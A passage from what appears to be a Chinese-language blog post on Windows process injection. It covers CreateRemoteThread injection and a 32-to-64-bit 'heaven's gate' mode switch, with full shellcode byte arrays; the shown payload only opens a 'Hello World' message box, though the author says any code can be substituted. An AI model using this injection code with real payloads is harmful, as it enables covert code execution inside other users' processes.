remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);    strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);    //为线程参数在宿主进程中开辟存储区域      RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(        TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);    if (!pRemoteParam) {        MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    //将线程参数拷贝到宿主进程地址空间中      if (!WriteProcessMemory(TargetProc,        pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    //在宿主进程中创建线程      HANDLE hRemoteThread = CreateRemoteThread(        TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,        pRemoteParam, 0, &amp;dwWriteBytes);    if (!hRemoteThread) {        MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);        return 0;    }    CloseHandle(hRemoteThread);    FreeLibrary(hUser32);    return 0;}</code></pre><h3 id="32位-gt-64位"><a href="#32位-gt-64位" class="headerlink" title="32位-&gt;64位"></a>32位-&gt;64位</h3><p>核心思路如下</p><ul><li>根据进程ID打开进程，获得进程句柄</li><li>申请内存空间</li><li>写入数据</li><li>将内存改为可读可执行(可选)</li><li>创建线程</li><li>等待线程退出(可选)</li></ul><p><strong>使用到的API</strong></p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>VirtualProtectEx</li><li><strong>CreateRemoteThread64</strong></li><li>WaitForSingleObject</li></ul><p>32位去注入64位进程时<code>CreateRemoteThread</code>会调用失败，需要使用64位的接口</p><p>先提升到64位汇编，在遍历ntdll.dll中的导出函数 <code>CreateRemoteThread</code></p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p><a href="https://www.cnblogs.com/HsinTsao/p/7270732.html" target="_blank" rel="noopener">32位注入64位参考</a></p><p>3g大佬代码代码有点问题，有点误导</p><p>获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的</p><blockquote><p> 在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，<strong>CS = 0x23</strong>；64位模式时，<strong>CS = 0x33</strong>。</p><p>这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令</p><p><code>pop ip</code></p><p><code>pop cs</code></p></blockquote><p>代码中<code>CREATETHREADPIC</code>shellcode是用来得到64位的<code>CreateRemoteThread</code></p><p><code>EXECPIC</code>是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码</p><pre><code class="c++">#pragma once  #include &lt;windows.h&gt;  #include &lt;TlHelp32.h&gt;  #include &lt;iostream&gt;using namespace std;#define CREATETHREADPIC_SIZE 271char CREATETHREADPIC[] = {    /* 0000 */ &quot;\x53&quot;                             /* push ebx                    */    /* 0001 */ &quot;\x56&quot;                             /* push esi                    */    /* 0002 */ &quot;\x57&quot;                             /* push edi                    */    /* 0003 */ &quot;\x55&quot;                             /* push ebp                    */    /* 0004 */ &quot;\xe8\x6c\x00\x00\x00&quot;             /* call 0x75                   */    /* 0009 */ &quot;\x85\xc0&quot;                         /* test eax, eax               */    /* 000B */ &quot;\x74\x5d&quot;                         /* jz 0x6a                     */    /* 000D */ &quot;\x48\x89\xe6&quot;                     /* mov rsi, rsp                */    /* 0010 */ &quot;\x48\x83\xe4\xf0&quot;                 /* and rsp, 0xfffffffffffffff0 */    /* 0014 */ &quot;\x48\x83\xec\x68&quot;                 /* sub rsp, 0x68               */    /* 0018 */ &quot;\xb8\xfa\x80\x39\x5e&quot;             /* mov eax, 0x5e3980fa         */    /* 001D */ &quot;\xe8\x78\x00\x00\x00&quot;             /* call 0x9a                   */    /* 0022 */ &quot;\x48\x89\xc3&quot;                     /* mov rbx, rax                */    /* 0025 */ &quot;\x4d\x31\xc0&quot;                     /* xor r8, r8                  */    /* 0028 */ &quot;\x48\x31\xc0&quot;                     /* xor rax, rax                */    /* 002B */ &quot;\x48\x89\x44\x24\x50&quot;             /* mov [rsp+0x50], rax         */    /* 0030 */ &quot;\x48\x89\x44\x24\x48&quot;             /* mov [rsp+0x48], rax         */    /* 0035 */ &quot;\x48\x89\x44\x24\x40&quot;             /* mov [rsp+0x40], rax         */    /* 003A */ &quot;\x48\x89\x44\x24\x38&quot;             /* mov [rsp+0x38], rax         */    /* 003F */ &quot;\x48\x89\x44\x24\x30&quot;             /* mov [rsp+0x30], rax         */    /* 0044 */ &quot;\x8b\x46\x24&quot;                     /* mov eax, [rsi+0x24]         */    /* 0047 */ &quot;\x48\x89\x44\x24\x28&quot;             /* mov [rsp+0x28], rax         */    /* 004C */ &quot;\x8b\x46\x20&quot;                     /* mov eax, [rsi+0x20]         */    /* 004F */ &quot;\x48\x89\x44\x24\x20&quot;             /* mov [rsp+0x20], rax         */    /* 0054 */ &quot;\x44\x8b\x4e\x14&quot;                 /* mov r9d, [rsi+0x14]         */    /* 0058 */ &quot;\xba\x00\x00\x00\x10&quot;             /* mov edx, 0x10000000         */    /* 005D */ &quot;\x8b\x4e\x30&quot;                     /* mov ecx, [rsi+0x30]         */    /* 0060 */ &quot;\xff\xd3&quot;                         /* call rbx                    */    /* 0062 */ &quot;\x48\x89\xf4&quot;                     /* mov rsp, rsi                */    /* 0065 */ &quot;\xe8\x18\x00\x00\x00&quot;             /* call 0x82                   */    /* 006A */ &quot;\x5d&quot;                             /* pop rbp                     */    /* 006B */ &quot;\x5f&quot;                             /* pop rdi                     */    /* 006C */ &quot;\x5e&quot;                             /* pop rsi                     */    /* 006D */ &quot;\x5b&quot;                             /* pop rbx                     */    /* 006E */ &quot;\xc3&quot;                             /* ret                         */    /* 006F */ &quot;\x31\xc0&quot;                         /* xor eax, eax                */    /* 0071 */ &quot;\x48\xf7\xd8&quot;                     /* neg eax                     */    /* 0074 */ &quot;\xc3&quot;                             /* ret                         */    /* 0075 */ &quot;\xe8\xf5\xff\xff\xff&quot;             /* call 0x6f                   */    /* 007A */ &quot;\x74\x05&quot;                         /* jz 0x81                     */    /* 007C */ &quot;\x58&quot;                             /* pop eax                     */    /* 007D */ &quot;\x6a\x33&quot;                         /* push 0x33                   */ //将cs修改为0x33    /* 007F */ &quot;\x50&quot;                             /* push eax                    */ //也就能执行64位汇编了    /* 0080 */ &quot;\xcb&quot;                             /* retf                        */    /* 0081 */ &quot;\xc3&quot;                             /* ret                         */    /* 0082 */ &quot;\xe8\xe8\xff\xff\xff&quot;             /* call 0x6f                   */    /* 0087 */ &quot;\x75\x10&quot;                         /* jnz 0x99                    */    /* 0089 */ &quot;\x58&quot;                             /* pop rax                     */    /* 008A */ &quot;\x83\xec\x08&quot;                     /* sub esp, 0x8                */    /* 008D */ &quot;\x89\x04\x24&quot;                     /* mov [rsp], eax              */    /* 0090 */ &quot;\xc7\x44\x24\x04\x23\x00\x00\x00&quot; /* mov dword [rsp+0x4], 0x23   */    /* 0098 */ &quot;\xcb&quot;                             /* retf                        */    /* 0099 */ &quot;\xc3&quot;                             /* ret                         */    /* 009A */ &quot;\x56&quot;                             /* push rsi                    */    /* 009B */ &quot;\x57&quot;                             /* push rdi                    */    /* 009C */ &quot;\x53&quot;                             /* push rbx                    */    /* 009D */ &quot;\x51&quot;                             /* push rcx                    */    /* 009E */ &quot;\x49\x89\xc0&quot;                     /* mov r8, rax                 */    /* 00A1 */ &quot;\x6a\x60&quot;                         /* push 0x60                   */    /* 00A3 */ &quot;\x5e&quot;                             /* pop rsi                     */    /* 00A4 */ &quot;\x65\x48\x8b\x06&quot;                 /* mov rax, [gs:rsi]           */    /* 00A8 */ &quot;\x48\x8b\x40\x18&quot;                 /* mov rax, [rax+0x18]         */    /* 00AC */ &quot;\x4c\x8b\x50\x30&quot;                 /* mov r10, [rax+0x30]         */    /* 00B0 */ &quot;\x49\x8b\x6a\x10&quot;                 /* mov rbp, [r10+0x10]         */    /* 00B4 */ &quot;\x48\x85\xed&quot;                     /* test rbp, rbp               */    /* 00B7 */ &quot;\x89\xe8&quot;                         /* mov eax, ebp                */    /* 00B9 */ &quot;\x74\x4f&quot;                         /* jz 0x10a                    */    /* 00BB */ &quot;\x4d\x8b\x12&quot;                     /* mov r10, [r10]              */    /* 00BE */ &quot;\x8b\x45\x3c&quot;                     /* mov eax, [rbp+0x3c]         */    /* 00C1 */ &quot;\x83\xc0\x10&quot;                     /* add eax, 0x10               */    /* 00C4 */ &quot;\x8b\x44\x05\x78&quot;                 /* mov eax, [rbp+rax+0x78]     */    /* 00C8 */ &quot;\x48\x8d\x74\x05\x18&quot;             /* lea rsi, [rbp+rax+0x18]     */    /* 00CD */ &quot;\xad&quot;                             /* lodsd                       */    /* 00CE */ &quot;\x91&quot;                             /* xchg ecx, eax               */    /* 00CF */ &quot;\x67\xe3\xde&quot;                     /* jecxz 0xb0                  */    /* 00D2 */ &quot;\xad&quot;                             /* lodsd                       */    /* 00D3 */ &quot;\x4c\x8d\x5c\x05\x00&quot;             /* lea r11, [rbp+rax]          */    /* 00D8 */ &quot;\xad&quot;                             /* lodsd                       */    /* 00D9 */ &quot;\x48\x8d\x7c\x05\x00&quot;             /* lea rdi, [rbp+rax]          */    /* 00DE */ &quot;\xad&quot;                             /* lodsd                       */    /* 00DF */ &quot;\x48\x8d\x5c\x05\x00&quot;             /* lea rbx, [rbp+rax]          */    /* 00E4 */ &quot;\x8b\x74\x8f\xfc&quot;                 /* mov esi, [rdi+rcx*4-0x4]    */    /* 00E8 */ &quot;\x48\x01\xee&quot;                     /* add rsi, rbp                */    /* 00EB */ &quot;\x31\xc0&quot;                         /* xor eax, eax                */    /* 00ED */ &quot;\x99&quot;                             /* cdq                         */    /* 00EE */ &quot;\xac&quot;                             /* lodsb                       */    /* 00EF */ &quot;\x01\xc2&quot;                         /* add edx, eax                */    /* 00F1 */ &quot;\xc1\xc2\x05&quot;                     /* rol edx, 0x5                */    /* 00F4 */ &quot;\xff\xc8&quot;                         /* dec eax                     */    /* 00F6 */ &quot;\x79\xf6&quot;                         /* jns 0xee                    */    /* 00F8 */ &quot;\x44\x39\xc2&quot;                     /* cmp edx, r8d                */    /* 00FB */ &quot;\xe0\xe7&quot;                         /* loopne 0xe4                 */    /* 00FD */ &quot;\x75\xb1&quot;                         /* jnz 0xb0                    */    /* 00FF */ &quot;\x0f\xb7\x14\x4b&quot;                 /* movzx edx, word [rbx+rcx*2] */    /* 0103 */ &quot;\x41\x8b\x04\x93&quot;                 /* mov eax, [r11+rdx*4]        */    /* 0107 */ &quot;\x48\x01\xe8&quot;                     /* add rax, rbp                */    /* 010A */ &quot;\x59&quot;                             /* pop rcx                     */    /* 010B */ &quot;\x5b&quot;                             /* pop rbx                     */    /* 010C */ &quot;\x5f&quot;                             /* pop rdi                     */    /* 010D */ &quot;\x5e&quot;                             /* pop rsi                     */    /* 010E */ &quot;\xc3&quot;                             /* ret                         */};#define EXECPIC_SIZE 1984char EXECPIC[] = {    /* 0000 */ &quot;\x48\x81\xec\xd8\x00\x00\x00&quot;                     /* sub rsp, 0xd8                            */    /* 0007 */ &quot;\x48\xc7\x44\x24\x78\x00\x00\x00\x00&quot;             /* mov qword [rsp+0x78], 0x0                */    /* 0010 */ &quot;\x48\xc7\x84\x24\x80\x00\x00\x00\x00\x00\x00\x00&quot; /* mov qword [rsp+0x80], 0x0                */    /* 001C */ &quot;\x48\xc7\x84\x24\xa8\x00\x00\x00\x00\x00\x00\x00&quot; /* mov qword [rsp+0xa8], 0x0                */    /* 0028 */ &quot;\xb8\x75\x00\x00\x00&quot;                             /* mov eax, 0x75                            */    /* 002D */ &quot;\x66\x89\x44\x24\x58&quot;                             /* mov [rsp+0x58], ax                       */    /* 0032 */ &quot;\xb8\x73\x00\x00\x00&quot;                             /* mov eax, 0x73                            */    /* 0037 */ &quot;\x66\x89\x44\x24\x5a&quot;                             /* mov [rsp+0x5a], ax                       */    /* 003C */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */    /* 0041 */ &quot;\x66\x89\x44\x24\x5c&quot;                             /* mov [rsp+0x5c], ax                       */    /* 0046 */ &quot;\xb8\x72\x00\x00\x00&quot;                             /* mov eax, 0x72                            */    /* 004B */ &quot;\x66\x89\x44\x24\x5e&quot;                             /* mov [rsp+0x5e], ax                       */    /* 0050 */ &quot;\xb8\x33\x00\x00\x00&quot;                             /* mov eax, 0x33                            */    /* 0055 */ &quot;\x66\x89\x44\x24\x60&quot;                             /* mov [rsp+0x60], ax                       */    /* 005A */ &quot;\xb8\x32\x00\x00\x00&quot;                             /* mov eax, 0x32                            */    /* 005F */ &quot;\x66\x89\x44\x24\x62&quot;                             /* mov [rsp+0x62], ax                       */    /* 0064 */ &quot;\xb8\x2e\x00\x00\x00&quot;                             /* mov eax, 0x2e                            */    /* 0069 */ &quot;\x66\x89\x44\x24\x64&quot;                             /* mov [rsp+0x64], ax                       */    /* 006E */ &quot;\xb8\x64\x00\x00\x00&quot;                             /* mov eax, 0x64                            */    /* 0073 */ &quot;\x66\x89\x44\x24\x66&quot;                             /* mov [rsp+0x66], ax                       */    /* 0078 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */    /* 007D */ &quot;\x66\x89\x44\x24\x68&quot;                             /* mov [rsp+0x68], ax                       */    /* 0082 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */    /* 0087 */ &quot;\x66\x89\x44\x24\x6a&quot;                             /* mov [rsp+0x6a], ax                       */    /* 008C */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */    /* 008E */ &quot;\x66\x89\x44\x24\x6c&quot;                             /* mov [rsp+0x6c], ax                       */    /* 0093 */ &quot;\xc6\x44\x24\x30\x4d&quot;                             /* mov byte [rsp+0x30], 0x4d                */    /* 0098 */ &quot;\xc6\x44\x24\x31\x65&quot;                             /* mov byte [rsp+0x31], 0x65                */    /* 009D */ &quot;\xc6\x44\x24\x32\x73&quot;                             /* mov byte [rsp+0x32], 0x73                */    /* 00A2 */ &quot;\xc6\x44\x24\x33\x73&quot;                             /* mov byte [rsp+0x33], 0x73                */    /* 00A7 */ &quot;\xc6\x44\x24\x34\x61&quot;                             /* mov byte [rsp+0x34], 0x61                */    /* 00AC */ &quot;\xc6\x44\x24\x35\x67&quot;                             /* mov byte [rsp+0x35], 0x67                */    /* 00B1 */ &quot;\xc6\x44\x24\x36\x65&quot;                             /* mov byte [rsp+0x36], 0x65                */    /* 00B6 */ &quot;\xc6\x44\x24\x37\x42&quot;                             /* mov byte [rsp+0x37], 0x42                */    /* 00BB */ &quot;\xc6\x44\x24\x38\x6f&quot;                             /* mov byte [rsp+0x38], 0x6f                */    /* 00C0 */ &quot;\xc6\x44\x24\x39\x78&quot;                             /* mov byte [rsp+0x39], 0x78                */    /* 00C5 */ &quot;\xc6\x44\x24\x3a\x41&quot;                             /* mov byte [rsp+0x3a], 0x41                */    /* 00CA */ &quot;\xc6\x44\x24\x3b\x00&quot;                             /* mov byte [rsp+0x3b], 0x0                 */    /* 00CF */ &quot;\xc6\x44\x24\x40\x48&quot;                             /* mov byte [rsp+0x40], 0x48                */    /* 00D4 */ &quot;\xc6\x44\x24\x41\x65&quot;                             /* mov byte [rsp+0x41], 0x65                */    /* 00D9 */ &quot;\xc6\x44\x24\x42\x6c&quot;                             /* mov byte [rsp+0x42], 0x6c                */    /* 00DE */ &quot;\xc6\x44\x24\x43\x6c&quot;                             /* mov byte [rsp+0x43], 0x6c                */    /* 00E3 */ &quot;\xc6\x44\x24\x44\x6f&quot;                             /* mov byte [rsp+0x44], 0x6f                */    /* 00E8 */ &quot;\xc6\x44\x24\x45\x2e&quot;                             /* mov byte [rsp+0x45], 0x2e                */    /* 00ED */ &quot;\xc6\x44\x24\x46\x57&quot;                             /* mov byte [rsp+0x46], 0x57                */    /* 00F2 */ &quot;\xc6\x44\x24\x47\x6f&quot;                             /* mov byte [rsp+0x47], 0x6f                */    /* 00F7 */ &quot;\xc6\x44\x24\x48\x6c&quot;                             /* mov byte [rsp+0x48], 0x6c                */    /* 00FC */ &quot;\xc6\x44\x24\x49\x72&quot;                             /* mov byte [rsp+0x49], 0x72                */    /* 0101 */ &quot;\xc6\x44\x24\x4a\x64&quot;                             /* mov byte [rsp+0x4a], 0x64                */    /* 0106 */ &quot;\xc6\x44\x24\x4b\x21&quot;                             /* mov byte [rsp+0x4b], 0x21                */    /* 010B */ &quot;\xc6\x44\x24\x4c\x00&quot;                             /* mov byte [rsp+0x4c], 0x0                 */    /* 0110 */ &quot;\xe8\x3b\x05\x00\x00&quot;                             /* call 0x650                               */    /* 0115 */ &quot;\x48\x89\x84\x24\x88\x00\x00\x00&quot;                 /* mov [rsp+0x88], rax                      */    /* 011D */ &quot;\x48\x83\xbc\x24\x88\x00\x00\x00\xff&quot;             /* cmp qword [rsp+0x88], 0xffffffffffffffff */    /* 0126 */ &quot;\x75\x05&quot;                                         /* jnz 0x12d                                */    /* 0128 */ &quot;\xe9\xd9\x01\x00\x00&quot;                             /* jmp 0x306                                */    /* 012D */ &quot;\x48\x8b\x84\x24\x88\x00\x00\x00&quot;                 /* mov rax, [rsp+0x88]                      */    /* 0135 */ &quot;\x48\x89\x44\x24\x28&quot;                             /* mov [rsp+0x28], rax                      */    /* 013A */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */    /* 013F */ &quot;\x48\x89\x84\x24\xb0\x00\x00\x00&quot;                 /* mov [rsp+0xb0], rax                      */    /* 0147 */ &quot;\x48\x8b\x84\x24\xb0\x00\x00\x00&quot;                 /* mov rax, [rsp+0xb0]                      */    /* 014F */ &quot;\x48\x63\x40\x3c&quot;                                 /* movsxd rax, dword [rax+0x3c]             */    /* 0153 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 0158 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 015B */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 015E */ &quot;\x48\x89\x84\x24\xb8\x00\x00\x00&quot;                 /* mov [rsp+0xb8], rax                      */    /* 0166 */ &quot;\xb8\x08\x00\x00\x00&quot;                             /* mov eax, 0x8                             */    /* 016B */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */    /* 016F */ &quot;\x48\x8b\x8c\x24\xb8\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xb8]                      */    /* 0177 */ &quot;\x8b\x84\x01\x88\x00\x00\x00&quot;                     /* mov eax, [rcx+rax+0x88]                  */    /* 017E */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 0183 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 0186 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 0189 */ &quot;\x48\x89\x44\x24\x50&quot;                             /* mov [rsp+0x50], rax                      */    /* 018E */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */    /* 0193 */ &quot;\x8b\x40\x20&quot;                                     /* mov eax, [rax+0x20]                      */    /* 0196 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 019B */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 019E */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 01A1 */ &quot;\x48\x89\x84\x24\xc0\x00\x00\x00&quot;                 /* mov [rsp+0xc0], rax                      */    /* 01A9 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */    /* 01AE */ &quot;\x8b\x40\x1c&quot;                                     /* mov eax, [rax+0x1c]                      */    /* 01B1 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 01B6 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 01B9 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 01BC */ &quot;\x48\x89\x84\x24\xa0\x00\x00\x00&quot;                 /* mov [rsp+0xa0], rax                      */    /* 01C4 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */    /* 01C9 */ &quot;\x8b\x40\x24&quot;                                     /* mov eax, [rax+0x24]                      */    /* 01CC */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 01D1 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 01D4 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 01D7 */ &quot;\x48\x89\x84\x24\x98\x00\x00\x00&quot;                 /* mov [rsp+0x98], rax                      */    /* 01DF */ &quot;\xc7\x44\x24\x74\x88\xef\xff\x6f&quot;                 /* mov dword [rsp+0x74], 0x6fffef88         */    /* 01E7 */ &quot;\xc7\x44\x24\x70\x7e\xaa\x8a\x3f&quot;                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */    /* 01EF */ &quot;\xc7\x44\x24\x20\x00\x00\x00\x00&quot;                 /* mov dword [rsp+0x20], 0x0                */    /* 01F7 */ &quot;\xeb\x0a&quot;                                         /* jmp 0x203                                */    /* 01F9 */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */    /* 01FD */ &quot;\xff\xc0&quot;                                         /* inc eax                                  */    /* 01FF */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */    /* 0203 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */    /* 0208 */ &quot;\x8b\x40\x18&quot;                                     /* mov eax, [rax+0x18]                      */    /* 020B */ &quot;\x39\x44\x24\x20&quot;                                 /* cmp [rsp+0x20], eax                      */    /* 020F */ &quot;\x0f\x83\xf1\x00\x00\x00&quot;                         /* jae 0x306                                */    /* 0215 */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */    /* 0219 */ &quot;\x48\x8b\x8c\x24\xc0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xc0]                      */    /* 0221 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */    /* 0224 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 0229 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 022C */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 022F */ &quot;\x48\x89\x84\x24\x90\x00\x00\x00&quot;                 /* mov [rsp+0x90], rax                      */    /* 0237 */ &quot;\x48\x8b\x8c\x24\x90\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x90]                      */    /* 023F */ &quot;\xe8\xac\x03\x00\x00&quot;                             /* call 0x5f0                               */    /* 0244 */ &quot;\x3b\x44\x24\x70&quot;                                 /* cmp eax, [rsp+0x70]                      */    /* 0248 */ &quot;\x75\x30&quot;                                         /* jnz 0x27a                                */    /* 024A */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */    /* 024E */ &quot;\x48\x8b\x8c\x24\x98\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x98]                      */    /* 0256 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */    /* 025A */ &quot;\x48\x8b\x8c\x24\xa0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */    /* 0262 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */    /* 0265 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 026A */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 026D */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 0270 */ &quot;\x48\x89\x84\x24\x80\x00\x00\x00&quot;                 /* mov [rsp+0x80], rax                      */    /* 0278 */ &quot;\xeb\x3e&quot;                                         /* jmp 0x2b8                                */    /* 027A */ &quot;\x48\x8b\x8c\x24\x90\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x90]                      */    /* 0282 */ &quot;\xe8\x69\x03\x00\x00&quot;                             /* call 0x5f0                               */    /* 0287 */ &quot;\x3b\x44\x24\x74&quot;                                 /* cmp eax, [rsp+0x74]                      */    /* 028B */ &quot;\x75\x2b&quot;                                         /* jnz 0x2b8                                */    /* 028D */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */    /* 0291 */ &quot;\x48\x8b\x8c\x24\x98\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x98]                      */    /* 0299 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */    /* 029D */ &quot;\x48\x8b\x8c\x24\xa0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */    /* 02A5 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */    /* 02A8 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */    /* 02AD */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */    /* 02B0 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */    /* 02B3 */ &quot;\x48\x89\x44\x24\x78&quot;                             /* mov [rsp+0x78], rax                      */    /* 02B8 */ &quot;\x48\x83\xbc\x24\x80\x00\x00\x00\x00&quot;             /* cmp qword [rsp+0x80], 0x0                */    /* 02C1 */ &quot;\x74\x3e&quot;                                         /* jz 0x301                                 */    /* 02C3 */ &quot;\x48\x83\x7c\x24\x78\x00&quot;                         /* cmp qword [rsp+0x78], 0x0                */    /* 02C9 */ &quot;\x74\x36&quot;                                         /* jz 0x301                                 */    /* 02CB */ &quot;\x48\x8d\x4c\x24\x58&quot;                             /* lea rcx, [rsp+0x58]                      */    /* 02D0 */ &quot;\xff\x54\x24\x78&quot;                                 /* call qword [rsp+0x78]                    */    /* 02D4 */ &quot;\x48\x8d\x54\x24\x30&quot;                             /* lea rdx, [rsp+0x30]                      */    /* 02D9 */ &quot;\x48\x8b\xc8&quot;                                     /* mov rcx, rax                             */    /* 02DC */ &quot;\xff\x94\x24\x80\x00\x00\x00&quot;                     /* call qword [rsp+0x80]                    */    /* 02E3 */ &quot;\x48\x89\x84\x24\xa8\x00\x00\x00&quot;                 /* mov [rsp+0xa8], rax                      */    /* 02EB */ &quot;\x45\x33\xc9&quot;                                     /* xor r9d, r9d                             */    /* 02EE */ &quot;\x45\x33\xc0&quot;                                     /* xor r8d, r8d                             */    /* 02F1 */ &quot;\x48\x8d\x54\x24\x40&quot;                             /* lea rdx, [rsp+0x40]                      */    /* 02F6 */ &quot;\x33\xc9&quot;                                         /* xor ecx, ecx                             */    /* 02F8 */ &quot;\xff\x94\x24\xa8\x00\x00\x00&quot;                     /* call qword [rsp+0xa8]                    */    /* 02FF */ &quot;\xeb\x05&quot;                                         /* jmp 0x306                                */    /* 0301 */ &quot;\xe9\xf3\xfe\xff\xff&quot;                             /* jmp 0x1f9                                */    /* 0306 */ &quot;\x48\x81\xc4\xd8\x00\x00\x00&quot;                     /* add rsp, 0xd8                            */    /* 030D */ &quot;\xc3&quot;                                             /* ret                                      */    /* 030E */ &quot;\xcc&quot;                                             /* int3                                     */    /* 030F */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0310 */ &quot;\x88\x4c\x24\x08&quot;                                 /* mov [rsp+0x8], cl                        */    /* 0314 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */    /* 0318 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */    /* 031D */ &quot;\x83\xf8\x41&quot;                                     /* cmp eax, 0x41                            */    /* 0320 */ &quot;\x7c\x13&quot;                                         /* jl 0x335                                 */    /* 0322 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */    /* 0327 */ &quot;\x83\xf8\x5a&quot;                                     /* cmp eax, 0x5a                            */    /* 032A */ &quot;\x7f\x09&quot;                                         /* jg 0x335                                 */    /* 032C */ &quot;\xc7\x04\x24\x01\x00\x00\x00&quot;                     /* mov dword [rsp], 0x1                     */    /* 0333 */ &quot;\xeb\x07&quot;                                         /* jmp 0x33c                                */    /* 0335 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */    /* 033C */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */    /* 033F */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */    /* 0343 */ &quot;\xc3&quot;                                             /* ret                                      */    /* 0344 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0345 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0346 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0347 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0348 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 0349 */ &quot;\xcc&quot;                                             /* int3                                     */    /* 034A */ &quot;\xcc&quot;                                             /* int3                                     */    /* 034B */ &quot;\xcc&quot;                                             /* int3                                     */    /* 034C */ &quot;\xcc&quot;                                             /* int3                                   